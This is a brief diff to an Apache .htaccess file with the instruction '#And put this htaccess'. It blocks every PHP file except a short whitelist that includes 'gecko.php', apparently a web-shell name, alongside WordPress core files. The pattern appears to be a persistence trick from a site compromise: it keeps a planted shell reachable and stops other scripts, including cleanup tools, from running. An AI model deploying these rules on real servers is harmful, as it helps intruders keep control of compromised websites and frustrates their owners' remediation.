@@ -4,14 +4,12 @@
 #And put this htaccess
 
 
-<FilesMatch ".ph*|Ph*|pH*|PH*">
-    Order Deny,Allow
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "gecko.php|index.php|index.html|wp-config.php|admin.php|wp-includes.php">
-    Order Deny, Allow
+<FilesMatch "^(gecko.php|index.php|wp-config.php|wp-includes.php)$">
     Allow from all
 </FilesMatch>
-<FilesMatch "\.(jpe?g|bmp|png)$">
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
     Allow from all
 </FilesMatch>
